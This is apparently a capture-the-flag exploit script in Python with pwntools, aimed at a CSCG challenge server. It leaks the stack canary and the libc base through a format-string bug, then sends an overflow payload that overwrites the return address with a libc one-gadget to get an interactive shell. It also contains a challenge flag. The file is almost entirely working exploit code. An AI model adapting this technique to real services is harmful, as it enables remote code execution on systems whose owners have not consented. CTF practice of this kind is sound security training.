#!/usr/bin/env python3
from pwn import *
import struct

# THIS_IS_TEST_FLAG | NOW_GET_VOLDEMORT
PASSWORD = 'CSCG{NOW_GET_VOLDEMORT}' # Set to flag from stage 2

LEAK_BASE_OFFSET = 0x271e3 # 0x271e3
MAGIC_OFFSET = 0x10afa9 # 0x10afa9

# target = process('./pwn3/pwn3')
target = remote('hax1.allesctf.net', 9102)

target.sendline(PASSWORD)

# Canary + Return of welcome()
target.sendline('%39$p %45$p')
leaked = target.recvline_contains('magic spell:')
canary = int(leaked.split(b' ')[0][2:], 16)
base = int(leaked.split(b' ')[1][2:], 16) - LEAK_BASE_OFFSET

log.info(f'Leaked canary: {hex(canary)}')
log.info(f'Leaked libc base address: {hex(base)}')
log.info(f'Target address: {hex(base + MAGIC_OFFSET)}')

target.sendline(b'Expelliarmus\0' +
	b'\0' * (cyclic_find(b'cnaa')) +
	struct.pack("<Q", canary) +
	b'x' * 8 +
	struct.pack("<Q", base + MAGIC_OFFSET) +
	b'\0' * 0x78)

target.interactive()
